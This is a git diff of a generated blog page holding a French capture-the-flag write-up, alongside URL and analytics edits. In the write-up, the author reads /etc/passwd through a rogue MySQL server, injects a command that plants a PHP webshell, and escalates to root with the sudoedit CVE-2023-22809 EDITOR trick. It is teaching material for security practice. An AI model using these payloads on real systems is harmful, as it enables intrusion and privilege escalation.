@@ -13,6 +13,8 @@ How to easily bypass htaccess. Pour cette première step on tombe sur une basic 
 <link rel="canonical" href="https://SpawnZii.github.io/posts/2023/01/esna-x-worty-web-worty-is-my-cheat-sheet/" />
 
 
+
+
     <title>
         
             [ESNA x Worty] Web - Worty is my cheat sheet :: SpawnZii 
@@ -26,7 +28,7 @@ How to easily bypass htaccess. Pour cette première step on tombe sur une basic 
 
 
 
-<link rel="stylesheet" href="https://SpawnZii.github.io/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
+<link rel="stylesheet" href="/main.4e5c639214707eff609bb55fe49e183dee42258a73bc90e4cc7b0a84f900798a.css">
 
 
     
@@ -34,12 +36,12 @@ How to easily bypass htaccess. Pour cette première step on tombe sur une basic 
     
 
 
-    <link rel="apple-touch-icon" sizes="180x180" href="https://SpawnZii.github.io/apple-touch-icon.png">
-    <link rel="icon" type="image/png" sizes="32x32" href="https://SpawnZii.github.io/favicon-32x32.png">
-    <link rel="icon" type="image/png" sizes="16x16" href="https://SpawnZii.github.io/favicon-16x16.png">
-    <link rel="manifest" href="https://SpawnZii.github.io/site.webmanifest">
-    <link rel="mask-icon" href="https://SpawnZii.github.io/safari-pinned-tab.svg" color="">
-    <link rel="shortcut icon" href="https://SpawnZii.github.io/favicon.ico">
+    <link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png">
+    <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+    <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png">
+    <link rel="manifest" href="/site.webmanifest">
+    <link rel="mask-icon" href="/safari-pinned-tab.svg" color="">
+    <link rel="shortcut icon" href="/favicon.ico">
     <meta name="msapplication-TileColor" content="">
 
 
@@ -89,6 +91,46 @@ How to easily bypass htaccess. Pour cette première step on tombe sur une basic 
 
 
 
+
+   
+   <!-- Thanks for using github/divinerites/plausible-hugo v1.17.2. Please, consider leaving a star on Github if you like it. -->
+
+
+
+
+
+
+
+
+
+
+    
+        <link rel="preconnect" href="https://plausible.io">
+    
+        
+        <script defer  data-domain="plausible.spawnzii.fr" src="https://plausible.io/js/plausible.js" ></script>
+
+<!-- If you are using Content-Security-Policy, do not forget to add this code to your CSP : 
+  script-src 'unsafe-inline' https://plausible.io
+  connect-src 'unsafe-inline' https://plausible.io
+  or just add the partial 'plausible_csp.html' to those 2 csp directives in your 'index.headers' file
+-->
+
+
+
+    
+    <script>window.plausible = window.plausible || function() { (window.plausible.q = window.plausible.q || []).push(arguments) }</script>
+    <script>
+         
+         
+         
+    </script>
+
+    
+
+
+
+
     </head>
 
     
@@ -98,7 +140,7 @@ How to easily bypass htaccess. Pour cette première step on tombe sur une basic 
         <div class="container">
             <header class="header">
     <span class="header__inner">
-        <a href="https://SpawnZii.github.io/" style="text-decoration: none;">
+        <a href="/" style="text-decoration: none;">
     <div class="logo">
         
             <span class="logo__mark"> </span>
@@ -116,7 +158,7 @@ How to easily bypass htaccess. Pour cette première step on tombe sur une basic 
         <span class="header__right">
             
                 <nav class="menu">
-    <ul class="menu__inner"><li><a href="https://SpawnZii.github.io/about/">About</a></li><li><a href="https://SpawnZii.github.io/posts/">Posts</a></li>
+    <ul class="menu__inner"><li><a href="/about/">About</a></li><li><a href="/posts/">Posts</a></li>
         <div class="submenu">
             <li class="dropdown">
                 <a href="javascript:void(0)" class="dropbtn">en</a>
@@ -176,25 +218,25 @@ Pour ne pas faire de gaspillage, Worty et Raccon ont monté un petit ctf afin de
 <h2 id="how-to-easily-bypass-htaccess">How to easily bypass htaccess.</h2>
 <p>Pour cette première step on tombe sur une basic auth nous bloquant l&rsquo;accès au site web.
 Après avoir essayé de bypass la basic auth pendant 1h j&rsquo;ai checké le discord :</p>
-<p><img src="https://SpawnZii.github.io/posts/rogue/did.png" alt="form"></p>
-<p><img src="https://SpawnZii.github.io/posts/rogue/cry.jpg" alt="form"></p>
+<p><img src="/posts/rogue/did.png" alt="form"></p>
+<p><img src="/posts/rogue/cry.jpg" alt="form"></p>
 <pre><code class="language-=bash" data-lang="=bash">cat password_backup.txt
 n = 27182620552013654529650369568565705748677788664051703513266337395733238092531875376829346079159553531457123241552276212754048764762797635636985153141836562181263670659187096790058296112802535209634384851308744617230046727673239246756952826924232293376061107683919851426832540778439598408277510744310544732957459849844992842925811561197892006975135616481557711186576487207986548862391841601897342637702244917677869425808610174878481560432102717330434682738133015928492136262931246958165047025992311590503274784010397877173897171306539670238221654690881938532539968726632926578906780554731266335133846058696129892487373
 c = 22191733097656334441268894550966894763003962701992806393075496528993952967174413647251750076754977373902498755399169194303850560509655763776682540871791477225627505896256751452512106584484111970129639411732978383350049327064540545061771400998692603383267325046814250034587633909699306942830032698775809959654194391837301127502864751635257273516727765369322388708880846946172958917138105995807073004261089626890874309034746318223146659787721194274327239382018007819161170277785075758050241154877512783308279500090525969540211725582763797061251883840441293887160665599549949044245489628854997218046199341708747648984665
 e = 64
 </code></pre><p>Comme j&rsquo;ai un gros niveau en crypto j&rsquo;ai direct sorti mon meilleur tool :</p>
-<p><img src="https://SpawnZii.github.io/posts/rogue/bypass.png" alt="form"></p>
+<p><img src="/posts/rogue/bypass.png" alt="form"></p>
 <p>(<strong>Attention, cette cascade a été réalisée par un professionnel, n&rsquo;essayez surtout pas de la reproduire en CTF</strong>).</p>
 <h2 id="arbitrary-file-read-via-rogue-sql">Arbitrary file read via rogue SQL.</h2>
 <p>Après avoir &ldquo;trouvé&rdquo; les creds on tombe directement sur un panel de configuration d&rsquo;une base de données.</p>
-<p><img src="https://SpawnZii.github.io/posts/rogue/db.png" alt="form"></p>
+<p><img src="/posts/rogue/db.png" alt="form"></p>
 <p>On comprend donc qu&rsquo;il faut exploiter une rogue SQL :).
 J&rsquo;ai utilisé un <a href="https://github.com/jib1337/Rogue-MySQL-Server">tool sur github</a>.</p>
 <p>Petit test pour récupérer <code>/etc/passwd</code>.</p>
-<p><img src="https://SpawnZii.github.io/posts/rogue/req.png" alt="form"></p>
-<p><img src="https://SpawnZii.github.io/posts/rogue/passwd.png" alt="form"></p>
+<p><img src="/posts/rogue/req.png" alt="form"></p>
+<p><img src="/posts/rogue/passwd.png" alt="form"></p>
 <p>J&rsquo;ai ensuite leak le source code de l&rsquo;app.</p>
-<p><img src="https://SpawnZii.github.io/posts/rogue/index.png" alt="form"></p>
+<p><img src="/posts/rogue/index.png" alt="form"></p>
 <div class="highlight"><pre style="color:#f8f8f2;background-color:#272822;-moz-tab-size:4;-o-tab-size:4;tab-size:4"><code class="language-php" data-lang="php"><span style="color:#75715e">&lt;?php</span>
 <span style="color:#66d9ef">if</span>(<span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;ip&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;username&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#a6e22e">isset</span>($_POST[<span style="color:#e6db74">&#34;password&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span>
    <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#34;ip&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#34;username&#34;</span>]) <span style="color:#f92672">&amp;&amp;</span> <span style="color:#f92672">!</span><span style="color:#66d9ef">empty</span>($_POST[<span style="color:#e6db74">&#34;password&#34;</span>]))
@@ -251,16 +293,16 @@ if($res === false)
 <p>Exemple : <code>python2 ../RogueSQL.py -f &quot;http://127.0.0.1/index.php?table=users</code>
 Maintenant J&rsquo;ai j&rsquo;upload mon webshell dans <strong>/var/www/html/</strong>.</p>
 <pre><code class="language-=bash" data-lang="=bash">python2 ../RogueSQL.py -f &quot;http://127.0.0.1/index.php?table=users')===system('echo%20\'&lt;?=\`\$_GET[0]\`;?&gt;\'&gt;/var/www/html/spz.php')||intval('1'&quot;
-</code></pre><p><img src="https://SpawnZii.github.io/posts/rogue/pld.png" alt="form"></p>
+</code></pre><p><img src="/posts/rogue/pld.png" alt="form"></p>
 <p>On peut appeler notre webshell.</p>
-<p><img src="https://SpawnZii.github.io/posts/rogue/id.png" alt="form"></p>
+<p><img src="/posts/rogue/id.png" alt="form"></p>
 <h2 id="privesc">Privesc</h2>
 <p>Notre utilisateur à des droits sudo :), en version 1.8.19p1.</p>
-<p><img src="https://SpawnZii.github.io/posts/rogue/sudo.png" alt="form"></p>
+<p><img src="/posts/rogue/sudo.png" alt="form"></p>
 <p>On va exploiter la <a href="https://www.synacktiv.com/sites/default/files/2023-01/sudo-CVE-2023-22809.pdf">CVE-2023-22809</a>.</p>
 <pre><code class="language-=bash" data-lang="=bash">export EDITOR=&quot;nano -- /root/flag.txt&quot; 
 sudo /usr/bin/sudoedit /etc/hosts
-</code></pre><p><img src="https://SpawnZii.github.io/posts/rogue/flag.png" alt="form"></p>
+</code></pre><p><img src="/posts/rogue/flag.png" alt="form"></p>
 
       </div>
     </article>
@@ -452,7 +494,7 @@ sudo /usr/bin/sudoedit /etc/hosts
 
 
 
-<script type="text/javascript" src="https://SpawnZii.github.io/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>
+<script type="text/javascript" src="/bundle.min.ace63d93098bf623f7c286a9084a4c22bfc482944c734f87fe0b685c7c6c7fa0ad2edb028c3b4b60d3343720c8ab490b320ad7f8edf4f6e9a6b898fc529057a9.js" integrity="sha512-rOY9kwmL9iP3woapCEpMIr/EgpRMc0&#43;H/gtoXHxsf6CtLtsCjDtLYNM0NyDIq0kLMgrX&#43;O309ummuJj8UpBXqQ=="></script>
 
 
 
